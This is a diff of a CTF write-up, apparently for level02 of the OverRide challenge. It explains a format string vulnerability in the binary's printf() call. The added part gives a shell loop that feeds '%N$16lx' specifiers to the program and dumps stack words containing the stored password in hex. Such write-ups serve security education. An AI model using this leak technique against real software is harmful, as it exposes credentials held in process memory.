@@ -32,3 +32,9 @@ Then, it invite user to input username and password. So it reads in at most one 
 Finally, it compares user's password to password read from the file. If it match, it open a new process runnign a shell.
 In case if password do not match, it ouputs username and message that it _does not have access!_.
 Here `printf()` is ussed is such way that input string is evaluated as a command by the application, which is know as (Format string attack)[https://owasp.org/www-community/attacks/Format_string_attack]. As the password still in the memory, it can be retrieved by passing to `printf()` a conversion specifier `%x`.
+
+As password is stored in the buffer and FSA can be performed, read the stack using long conversion specifier `%lx`.
+```shell
+level02@OverRide:~$ for i in {0..26}; do python -c "print('%$i\$16lx')" | ./level02 | grep -oE '[a-f0-9]{16}' | tr '\n' ' '; done; echo
+2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 
+```
